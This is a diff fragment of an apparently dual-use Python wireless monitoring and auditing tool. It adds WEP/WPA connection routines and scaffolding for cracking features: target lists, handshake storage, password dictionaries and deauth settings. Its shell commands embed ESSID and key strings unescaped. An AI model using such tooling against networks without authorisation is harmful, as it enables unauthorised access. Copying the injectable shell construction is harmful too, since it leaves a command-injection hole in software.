+        __builtin__.GATEWAY=str(ps.stdout.read().replace("\n","").lstrip().rstrip())
+    return readout
+
+def EnableConnection(iface):
+    if iface!="":
+        printl (fcolor.SWhite + "[.]   " + fcolor.SGreen + "Assigning DHCP..." ,"1","")
+        cmdLine="dhclient " + str(__builtin__.SELECTED_MANIFACE) + " > /dev/null 2>&1"
+        ps=Popen(str(cmdLine), shell=True, stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)
+        ps.wait();print " Done."
+        printl (fcolor.SWhite + "[.]   " + fcolor.SGreen + "Retreiving assigned IP Address & Gateway.." ,"1","")
+        IPAddr=GetIPAddress(__builtin__.SELECTED_MANIFACE)
+        print " Done."
+        if __builtin__.IPADDR!="":
+            if __builtin__.GATEWAY!="":
+                printc (" ",fcolor.SWhite + "IP Address : " + fcolor.BGreen + str(__builtin__.IPADDR) + "\t\t" + fcolor.SWhite + "Gateway : " + fcolor.BGreen + str(__builtin__.GATEWAY),"")
+            else:
+                printc (" ",fcolor.SWhite + "IP Address : " + fcolor.BGreen + str(__builtin__.IPADDR) + "\t\t" + fcolor.SWhite + "Gateway : " + fcolor.SRed + "Unknown","")
+        else:
+            printc (" ",fcolor.SRed + "Failed to get IP address..","")    
+
+def ConnectWEP(ESSID,WEPKey):
+    __builtin__.SELECTED_MANIFACE_MAC=GetMyMAC(__builtin__.SELECTED_MANIFACE)
+    print ""
+    printc (".",fcolor.BGreen + "Connecting to ESSID [ " + fcolor.BPink + str(ESSID) + fcolor.BGreen + " ] using interface " + fcolor.BRed + str(__builtin__.SELECTED_MANIFACE) + fcolor.BGreen + " [ " + fcolor.BRed + str(__builtin__.SELECTED_MANIFACE_MAC) + fcolor.BGreen + " ] ","")
+    printc (".",fcolor.BGreen + "WEP Key : " + fcolor.BRed + str(WEPKey) + fcolor.BGreen + "... Please wait..." ,"")
+    ps=subprocess.Popen("ifconfig " + str(__builtin__.SELECTED_MANIFACE) + " down" , shell=True, stdout=subprocess.PIPE)												
+    ps=subprocess.Popen("iwconfig " + str(__builtin__.SELECTED_MANIFACE) + " mode managed" , shell=True, stdout=subprocess.PIPE)												
+    ps=subprocess.Popen("iwconfig " + str(__builtin__.SELECTED_MANIFACE) + " essid " + str(ESSID) , shell=True, stdout=subprocess.PIPE)												
+    ps=subprocess.Popen("iwconfig " + str(__builtin__.SELECTED_MANIFACE) + " key open " + str(WEPKey) , shell=True, stdout=subprocess.PIPE)												
+    ps=subprocess.Popen("iwconfig " + str(__builtin__.SELECTED_MANIFACE) + " enc on" , shell=True, stdout=subprocess.PIPE)												
+    print ""
+    usr_resp=AskQuestion("Do you want to continue with the connection ?" + fcolor.BGreen,"Y/n","U","Y","1")
+    print ""
+    if usr_resp=="Y":
+        EnableConnection(__builtin__.SELECTED_MANIFACE)
+
+def ConnectWPA(ESSID,WPAKey):
+    TIMEOUT=120
+    printc ("!!!","Note : " + fcolor.BYellow + "Network Manager must be disabled in-order to connect to an access point.\n","")
+    Result=ServiceCheck("network-manager","Network Manager", "QDIE","1")
+    if Result!="Y" and Result!="":
+        printc ("!!!","You have choose not to disable the network manager, connection attempts to the specified access point likely to fail !!!","")
+    __builtin__.SELECTED_MANIFACE_MAC=GetMyMAC(__builtin__.SELECTED_MANIFACE)
+    wpas_conf=tmpdir + "wpa_supplicant.conf"
+    DelFile(wpas_conf,"")
+    DelFile(__builtin__.ConnectionResult,"")
+    ps=subprocess.Popen("wpa_passphrase " + str(ESSID) + " '" + WPAKey + "' > " + wpas_conf, shell=True, stdout=subprocess.PIPE)
+    WPAS_PID=ps.pid
+    print ""
+    printc (".",fcolor.BGreen + "Connecting to ESSID [ " + fcolor.BPink + str(ESSID) + fcolor.BGreen + " ] using interface " + fcolor.BRed + str(__builtin__.SELECTED_MANIFACE) + fcolor.BGreen + " [ " + fcolor.BRed + str(__builtin__.SELECTED_MANIFACE_MAC) + fcolor.BGreen + " ] ","")
+    printc (".",fcolor.BGreen + "Passphase : " + fcolor.BRed + str(WPAKey) + fcolor.BGreen + "... Please wait..." + fcolor.SGreen + "Connection will stop if failed after " + str(TIMEOUT) + " seconds.." ,"")
+    ps=subprocess.Popen("ifconfig " + str(__builtin__.SELECTED_MANIFACE) + " down" , shell=True, stdout=subprocess.PIPE)												
+    ps=subprocess.Popen("killall wpa_supplicant > /dev/null 2>&1" , shell=True, stdout=subprocess.PIPE)	
+    TIMEOUT=float(TIMEOUT)
+    print ""
+    mcmd="wpa_supplicant -Dwext -i " + str(__builtin__.SELECTED_MANIFACE) + " -c " + wpas_conf + " -f " + str(__builtin__.ConnectionResult) + " > /dev/null 2>&1"
+    cmdLine="xterm -geometry 100x5-0-10 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Connecting to " + str(ESSID) + "' -e '" + str(mcmd) +  "'"
+    ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)		
+    ps=subprocess.Popen("ifconfig " + str(__builtin__.SELECTED_MANIFACE) + " up" , shell=True, stdout=subprocess.PIPE)												
+    CONNECTED=""
+    TIMEOUTCT=0
+    while CONNECTED=="":
+        time.sleep(1)
+        TIMEOUTCT=TIMEOUTCT+1
+        if os.path.exists(__builtin__.ConnectionResult):
+            with open(__builtin__.ConnectionResult,"r") as f:
+                ps=subprocess.Popen("ifconfig " + str(__builtin__.SELECTED_MANIFACE) + " up" , shell=True, stdout=subprocess.PIPE)												
+                for line in f:
+                    line=line.replace("\n","")
+                    if line!="":
+                        print "line : " + str(line)
+                        if str(line).find("CTRL-EVENT-CONNECTED")!=-1:
+                            idx=str(line).find("CTRL-EVENT-CONNECTED - Connection to ")
+                            idx=idx+37
+                            lst=str(line)[int(idx):].lstrip().rstrip()
+                            CBSSID=str(lst).split(" ")
+                            printc (" ",fcolor.BBlue + "Connection to [ " + fcolor.BWhite + str(CBSSID[0]).upper() + " - " + fcolor.BPink + str(ESSID)  + fcolor.BBlue + " ] using [ " + fcolor.BYellow + str(WPAKey) + fcolor.BBlue + " ] was successful.","")
+                            CONNECTED="1"
+                            print ""
+                            usr_resp=AskQuestion("Do you want to continue with the connection ?" + fcolor.BGreen,"y/N","U","N","1")
+                            print ""
+                            if usr_resp!="Y":
+                                printl (fcolor.SWhite + "[.]   " + fcolor.SRed + "Terminating connection..." ,"1","")
+                                KillSubProc(str(WPAS_PID))
+                                print fcolor.SGreen + " Done."
+                            else:
+                                EnableConnection(__builtin__.SELECTED_MANIFACE)
+                        if str(line).find("4-Way Handshake failed - pre-shared key may be incorrect")!=-1:
+                            printc (" ",fcolor.BRed + "Connection to [ " + fcolor.BWhite + str(ESSID)  + fcolor.BRed + " ] using [ " + fcolor.BYellow + str(WPAKey) + fcolor.BRed + " ] failed. Pre-shared key may be incorrect.","")
+                            KillSubProc(str(WPAS_PID))
+                            CONNECTED="1"
+                        if str(line).find("Associated with ")!=-1:
+                            idx=str(line).find("Associated with ")
+                            idx=idx+16
+                            CBSSID=str(line[idx:]).lstrip().rstrip().upper()
+                            printc (" ",fcolor.SGreen + "Associated with [ " + fcolor.SWhite + str(CBSSID)  + fcolor.SGreen + " ]...","")
+                        if str(line).find("Authentication with ")!=-1 and str(line).find("timed out")!=-1:
+                            idx=str(line).find("Authentication with ")
+                            idx=idx+20
+                            lst=str(line)[int(idx):].lstrip().rstrip()
+                            CBSSID=str(lst).split(" ")
+                            printc (" ",fcolor.SYellow + "Authentication with [ " + fcolor.SWhite + str(CBSSID[0].upper())  + fcolor.SYellow + " ] time out... ","")
+                        if str(line).find("Failed to initiate AP scan")!=-1:
+                            printc (" ",fcolor.SRed + "Initate Access Point Scanning Failed !!!.","")
+                        if str(line).find("CTRL-EVENT-DISCONNECTED")!=-1:
+                            printc (" ",fcolor.SRed + "Connection to [ " + fcolor.SWhite + str(ESSID)  + fcolor.SRed + " ] disconnected.","")
+                        if str(line).find("Trying to associate with ")!=-1:
+                            idx=str(line).find("Trying to associate with ")
+                            lst=str(line)[int(idx)+25:].lstrip().rstrip()
+                            CBSSID=str(lst).split(" ")
+                            idx=idx+25 + 18
+                            Result=str(line[idx:]).lstrip().rstrip().replace("(","").replace(")","")
+                            DMsg=fcolor.SGreen + "Trying associate with " + "BSSID=" + str(CBSSID[0]).upper() + " " + str(Result)  + fcolor.SGreen + " ..."
+                            DMsg=str(DMsg).replace(" BSSID=",fcolor.SGreen + " BSSID=" + fcolor.SWhite).replace("SSID=",fcolor.SGreen + "SSID=" + fcolor.SWhite).replace("freq=",fcolor.SGreen + "Freq=" + fcolor.SWhite)
+                            printc (" ",DMsg,"")
+                        if str(line).find("Key negotiation completed with ")!=-1:
+                            idx=str(line).find("Key negotiation completed with ")
+                            idx=idx+31 + 18
+                            Result=str(line[idx:]).lstrip().rstrip().upper().replace("[","").replace("]","")
+                            DMsg=fcolor.SGreen + "Key Negotiation Completed. [ " + fcolor.BGreen + str(Result)  + fcolor.SGreen + " ]..."
+                            DMsg=str(DMsg).replace("PTK=",fcolor.SGreen + "PTK=" + fcolor.SWhite).replace("GTK=",fcolor.SGreen + "GTK=" + fcolor.SWhite).replace("freq=",fcolor.SGreen + "Freq=" + fcolor.SWhite)
+                            printc (" ",DMsg,"")
+                open(__builtin__.ConnectionResult,"w").write("")
+        if TIMEOUTCT>TIMEOUT and CONNECTED=="":
+            print ""
+            printc ("!!!",fcolor.BRed + "Connection Timeout... Exiting...","")                     
+            KillSubProc(str(WPAS_PID))
+            CONNECTED="1"
+    return
+
 def Check_OUI(MACAddr,CMD):
     Result=""
     OUI=""
@@ -9446,18 +13800,27 @@ def Check_OUI(MACAddr,CMD):
         MACAddr=MACAddr.replace(":","")
         MACAddr9=MACAddr[:9]
         MACAddr6=MACAddr[:6]
+        MACAddr8=MACAddr[:8]
         MACAddr12=MACAddr[:12]
         if IsFileDirExist(__builtin__.MACOUI)=="F":
             if CMD=="":
-                cmdLine="grep -w " + str(MACAddr6) + " " + str(__builtin__.MACOUI)
+                cmdLine="grep -w " + str(MACAddr8) + " " + str(__builtin__.MACOUI)
                 ps=Popen(str(cmdLine), shell=True, stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)
-                readout=str(ps.stdout.read().replace("\n","").replace(MACAddr6,"").lstrip().rstrip())
+                readout=str(ps.stdout.read().replace("\n","").replace(MACAddr8,"").lstrip().rstrip())
                 ps.wait();ps.stdout.close()
                 if readout!="":
                     OUI=str(readout)
                     return OUI
                 else:
-                    return "Unknown"
+                    cmdLine="grep -w " + str(MACAddr6) + " " + str(__builtin__.MACOUI)
+                    ps=Popen(str(cmdLine), shell=True, stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)
+                    readout=str(ps.stdout.read().replace("\n","").replace(MACAddr6,"").lstrip().rstrip())
+                    ps.wait();ps.stdout.close()
+                    if readout!="":
+                        OUI=str(readout)
+                        return OUI
+                    else:
+                        return "Unknown"
             else:
                 cmdLine="grep -w " + str(MACAddr12) + " " + str(__builtin__.MACOUI)
                 ps=Popen(str(cmdLine), shell=True, stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)
@@ -9983,7 +14346,6 @@ def CheckDiffBSSIDConnection():
     if len(Similar_ESSID)>0:
         x=0
         while x<len(Similar_ESSID) and CheckWhitelist(Similar_ESSID[x])=="":
-            print "CheckWhitelist : " + str(CheckWhitelist(Similar_ESSID[x]))
             if len(str(x))==1:
                 spacer="  "
             if len(str(x))==2:
@@ -10431,6 +14793,14 @@ def RecalculateClient():
         __builtin__.ListInfo_SSIDElapse[x]= str(Elapse)
         __builtin__.ListInfo_SSIDTimeGap[x]= str(__builtin__.TimeGap)
         __builtin__.ListInfo_SSIDTimeGapFull[x]= str(__builtin__.TimeGapFull)
+        if __builtin__.ListInfo_Privacy[x]=="WEP":
+            if __builtin__.ListInfo_Cipher[x]=="CCMP/TKIP" or __builtin__.ListInfo_Cipher[x]=="CCMP":
+                __builtin__.ListInfo_Privacy[x]="WPA2"
+            if __builtin__.ListInfo_Cipher[x]=="TKIP":
+                __builtin__.ListInfo_Privacy[x]="WPA"
+        if __builtin__.ListInfo_Privacy[x]=="WPA2" or __builtin__.ListInfo_Privacy[x]=="WPA":
+            if str(__builtin__.ListInfo_Cipher[x]).find("WEP")!=-1:
+                __builtin__.ListInfo_Cipher[x]="CCMP"
         x += 1
     x=0
     while x<len(ListInfo_STATION):
@@ -10456,11 +14826,6 @@ def FindESSID(MACAddr):
         if ListInfo_BSSID[ax]==MACAddr:
             Result=ListInfo_ESSID[ax]
             return Result
-        else:
-            print "ax = " + str(ax)
-            print "MACAddr = " + str(MACAddr)
-            print "ListInfo_BSSID[ax] = " + str(ListInfo_BSSID[ax])
-            printc ("x","","")
     return ""
 
 def EnrichDump():
@@ -10902,6 +15267,9 @@ def SaveConfig(CMD):
     open(ConfigFile,"a+b").write("THRESHOLD_QOS=" + str(__builtin__.THRESHOLD_QOS) + "\n")
     open(ConfigFile,"a+b").write("THRESHOLD=" + str(__builtin__.THRESHOLD) + "\n")
     open(ConfigFile,"a+b").write("SENSITIVITY_LVL=" + str(__builtin__.SENSITIVITY_LVL) + "\n")
+    if __builtin__.SELECTED_DICT=="":
+        __builtin__.SELECTED_DICT=__builtin__.DEFAULT_DICT
+    open(ConfigFile,"a+b").write("DICTIONARY=" + str(__builtin__.SELECTED_DICT) + "\n")
     if CMD!="":
         printc ("i",fcolor.BRed + "Application Setting Saved...","")
 
@@ -10993,6 +15361,8 @@ def LoadConfig():
                     __builtin__.SENSITIVITY_LVL4= [__builtin__.THRESHOLD_DATA86,__builtin__.THRESHOLD_DATAARP,__builtin__.THRESHOLD_DATA94,__builtin__.THRESHOLD_DATA98,__builtin__.THRESHOLD_ASSOC,__builtin__.THRESHOLD_DISASSOC,__builtin__.THRESHOLD_REASSOC,__builtin__.THRESHOLD_AUTH,__builtin__.THRESHOLD_DEAUTH,__builtin__.THRESHOLD_DEAUTH_AC,__builtin__.THRESHOLD_EAPOL_STD, __builtin__.THRESHOLD_EAPOL_START,__builtin__.THRESHOLD_WPS,__builtin__.THRESHOLD_QOS,__builtin__.THRESHOLD ]   # CUSTOM
                     if tmpList[0]=="A" and tmpList[1]!="":
                         A=tmpList[1]
+                    if tmpList[0]=="DICTIONARY" and tmpList[1]!="":
+                        __builtin__.SELECTED_DICT=str(tmpList[1])
     else:
         SaveConfig("")
     if __builtin__.DISABLE_BREAK=="Yes":
@@ -11800,23 +16170,29 @@ __builtin__.MACOUI=dbdir + "mac-oui.db"
 CautiousLog=dbdir + FilenameHeader + "Cautious.log"
 AttackLog=dbdir + FilenameHeader + "Attacks.log"
 SuspiciousLog=dbdir + FilenameHeader + "Suspicious.log"
+__builtin__.Sniffer=""
 DBFile1=dbdir + FilenameHeader + "APnStation.db"
 DBFile2=dbdir + FilenameHeader + "AccessPoint.db"
 DBFile3=dbdir + FilenameHeader + "Station.db"
 DBFile4=dbdir + FilenameHeader + "Probes.db"
 DBFile5=dbdir + FilenameHeader + "ConnectHistory.db"
 DBFile6=dbdir + FilenameHeader + "SwitchedAP.db"
+DBFile7=dbdir + FilenameHeader + "Dictionary.db"
+CrackDB=dbdir + FilenameHeader + "Cracked.db"
 EncDBFile=dbdir + FilenameHeader + "Encrypted.enc"
 __builtin__.SELECTED_MANIFACE_MAC=[]
 __builtin__.SELECTED_IFACE_MAC=[]
+__builtin__.SELECTED_ATK=[]
 __builtin__.SELECTED_MON_MAC=[]
+__builtin__.SELECTED_ATK_MAC=[]
 __builtin__.MonitoringMACList=[]
 __builtin__.WhiteMACList=[]
 __builtin__.WhiteNameList=[]
 __builtin__.ScriptName=os.path.basename(__file__)
 __builtin__.ScriptFullPath=str(os.path.realpath(os.path.dirname(sys.argv[0]))) + "/" + str(os.path.basename(__file__))
 __builtin__.IPSScript=appdir + "Stn.DeAuth.py"
-__builtin__.RequiredFiles=['tshark', 'airodump-ng', 'aireplay-ng','aircrack-ng','iwconfig', 'ifconfig', 'xterm', 'wireshark','tcpdump']
+__builtin__.Dictionary=['/usr/share/john/password.lst','/usr/share/nmap/nselib/data/passwords.lst']
+__builtin__.RequiredFiles=['tshark', 'airodump-ng', 'aireplay-ng','aircrack-ng','iwconfig', 'ifconfig', 'xterm', 'wireshark','tcpdump','wpa_supplicant']
 __builtin__.Captured_CSV=tmpdir + "Collect-Dump-01.csv"
 __builtin__.NewCaptured_CSV=tmpdir + "Dumps.csv"
 __builtin__.NewCaptured_CSVFront=tmpdir + "Dumps-Front.csv"
@@ -11837,6 +16213,8 @@ __builtin__.TCPDumpFileBak=tmpdir + "BAK_TCPDump"
 __builtin__.TSharkFileBak=tmpdir + "BAK_TSharkNew"
 __builtin__.TSharkFileBak2=tmpdir + "BAK_TSharkNew2"
 __builtin__.TSharkFileBak_Std=tmpdir + "BAK_TSharkStd"
+__builtin__.CapFile=""
+__builtin__.CapFileSize=""
 __builtin__.WiresharkCap=tmpdir + "LiveCaptured.cap"
 __builtin__.SavedTSharkFile=savedir + "_TShark_Analysed"
 __builtin__.SavedTCPDumpFile=savedir + "_TCPDump_Analysed"
@@ -11936,6 +16314,8 @@ __builtin__.NETWORK_ASSOCIATED_FILTER="ALL"
 __builtin__.NETWORK_UNASSOCIATED_FILTER="ALL"
 __builtin__.NETWORK_CSIGNAL_FILTER="ALL"
 __builtin__.NETWORK_UCSIGNAL_FILTER="ALL"
+__builtin__.NETWORK_ESSID_FILTER=""
+__builtin__.NETWORK_BSSID_FILTER=""
 __builtin__.MSG_HistoryConnection=""
 __builtin__.MSG_AttacksLogging=""
 __builtin__.MSG_SuspiciousListing=""
@@ -11956,6 +16336,7 @@ __builtin__.AP_ESSIDList=[]
 __builtin__.AP_MODEList=[]
 __builtin__.AP_CHANNELList=[]
 __builtin__.AP_ENCTYPEList=[]
+__builtin__.WEP_PPS=600
 __builtin__.ListInfo_CExist = 0
 __builtin__.ListInfo_CAdd = 0
 __builtin__.ListInfo_CRemoved = 0
@@ -11977,6 +16358,8 @@ __builtin__.LOAD_IWLIST="Yes"
 __builtin__.LOAD_PKTCAPTURE="Yes"
 __builtin__.SAVE_MONPKT="No"
 __builtin__.SAVE_ATTACKPKT="Yes"
+__builtin__.DEFAULT_DICT=dbdir + "dictionary.txt"
+__builtin__.SELECTED_DICT=""
 __builtin__.PCapProc=""
 __builtin__.SearchType=""
 __builtin__.SearchTypelbl=""
@@ -11995,6 +16378,7 @@ __builtin__.FileName=""
 __builtin__.FileNameOnly=""
 __builtin__.FileExt=""
 __builtin__.FileSize=""
+__builtin__.FileSizeB=""
 __builtin__.List_ANALYZER=[]
 __builtin__.List_FrMAC=[]
 __builtin__.List_ToMAC=[]
@@ -12028,6 +16412,33 @@ __builtin__.OfInterest_List=[]
 __builtin__.List_AttackingMAC=[]
 __builtin__.List_MonitoringMAC=[]
 __builtin__.List_AllMAC=[]
+__builtin__.CUR_CLIENT=[]
+__builtin__.CUR_CLIENT_FS=[]
+__builtin__.CUR_CLIENT_LS=[]
+__builtin__.CUR_CLIENT_PWR=[]
+__builtin__.CUR_CLIENT_DATA=[]
+__builtin__.CUR_CLIENT_PROBE=[]
+__builtin__.CUR_CLIENT_MAC=[]
+__builtin__.CUR_CLIENT_PDATA=[]
+__builtin__.NEW_CLIENT=[]
+__builtin__.NEW_CLIENT_FS=[]
+__builtin__.NEW_CLIENT_LS=[]
+__builtin__.NEW_CLIENT_PWR=[]
+__builtin__.NEW_CLIENT_DATA=[]
+__builtin__.NEW_CLIENT_PROBE=[]
+__builtin__.ATTACK_AP_BSSID=""
+__builtin__.ATTACK_AP_PWR=""
+__builtin__.ATTACK_AP_DATA=""
+__builtin__.ATTACK_AP_PDATA=""
+__builtin__.ATTACK_AP_PBEACON=""
+__builtin__.ATTACK_AP_FS=""
+__builtin__.ATTACK_AP_LS=""
+__builtin__.ATTACK_AP_ESSID=""
+__builtin__.ATTACK_AP_BEACON=""
+__builtin__.ATTACK_AP_PRIVACY=""
+__builtin__.ATTACK_AP_CIPHER=""
+__builtin__.ATTACK_AP_AUTH=""
+__builtin__.ATTACK_AP_CH=""
 __builtin__.FoundFiles=[]
 __builtin__.FoundFiles_Filtered=[]
 __builtin__.ExtList= ['pcap','cap']
@@ -12059,10 +16470,66 @@ __builtin__.CURRENT_LOC=""
 __builtin__.tabspace="   "
 __builtin__.tabspacefull="      "
 __builtin__.PrintToFile=""
-__builtin__.tabspace="   "
 __builtin__.tabspacefull="      "
 __builtin__.spacing=""
 __builtin__.DEBUG=0
+__builtin__.TargetList_WEP=[]
+__builtin__.TargetList_WPA1=[]
+__builtin__.TargetList_WPA2=[]
+__builtin__.TargetList_WPS=[]
+__builtin__.TargetList_All=[]
+__builtin__.CUR_CLIENT=[]
+__builtin__.ProcID=""
+__builtin__.ProcIDList=[]
+__builtin__.Authenticator=""
+__builtin__.CrackProc=""
+__builtin__.Sniffer=""
+__builtin__.WEP_ARPFILE=""
+__builtin__.WEP_ARPFILELIST=[]
+__builtin__.WEPKeyFile=""
+__builtin__.WEP_File=""
+__builtin__.WEP_KOREK=""
+__builtin__.WEP_FRAG=""
+__builtin__.WPS_File=""
+__builtin__.WPS_File2=""
+__builtin__.WPA_AUTOCLIENT="ON"
+__builtin__.WPA_DEAUTH_MAC=""
+__builtin__.WPAKeyFile=""
+__builtin__.ListNum=""
+__builtin__.DB_BSSID=""
+__builtin__.DB_ENCTYPE=""
+__builtin__.DB_ENCKEY=""
+__builtin__.DB_ESSID=""
+__builtin__.DB_HSFILE=""
+__builtin__.DB_WPS=""
+__builtin__.DB_HSSAVED="0"
+__builtin__.HS_File=""
+__builtin__.HS_FileFull=""
+__builtin__.HS_FileStrict=""
+__builtin__.STR_HEX=""
+__builtin__.STR_HEXCOLON=""
+__builtin__.STR_CHR=""
+__builtin__.STR_LEN=""
+__builtin__.STR_LENHEX=""
+__builtin__.STR_BIT=""
+__builtin__.TIMER_RET=""
+__builtin__.TStart=""
+__builtin__.DictionaryList=[]
+__builtin__.DictionaryListD=[]
+__builtin__.CapFileList=[]
+__builtin__.ConnectionResult=tmpdir + "connection_result.txt"
+__builtin__.IPADDR=""
+__builtin__.GATEWAY=""
+HANDSHAKE_LIST1=[]
+HANDSHAKE_LIST1R=[]
+HANDSHAKE_LIST2=[]
+HANDSHAKE_LIST2R=[]
+HANDSHAKE_LIST3=[]
+HANDSHAKE_LIST3R=[]
+HANDSHAKE_LIST4=[]
+HANDSHAKE_LIST4R=[]
+__builtin__.HandshakeSaved_Aircrack=""
+NULLOUT = open(os.devnull, 'w')
 original_sigint=""
 if __name__ == '__main__':
     try:
